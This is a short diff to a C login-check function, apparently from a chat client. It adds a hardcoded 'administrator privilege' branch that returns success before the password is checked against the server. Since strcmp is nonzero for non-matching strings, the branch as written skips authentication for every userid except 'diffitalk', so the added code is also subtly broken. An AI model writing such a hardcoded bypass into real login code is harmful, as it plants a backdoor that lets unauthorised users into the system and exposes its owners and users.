@@ -140,6 +140,13 @@ int loginAndRigistCheck(char *userid, char *password, Kind kind, char *c_ipAddr,
 	int MAXLINE = 4096;
 	char buf[MAXLINE];
 	Data data;
+	
+	//设置一个管理员权限
+	if(strcmp(userid,"diffitalk"))
+	{
+		return  1;
+	}
+
 
 	printf("c_ip: %s\n", c_ipAddr);
 	client_socket = init_client(MYPORT, c_ipAddr);
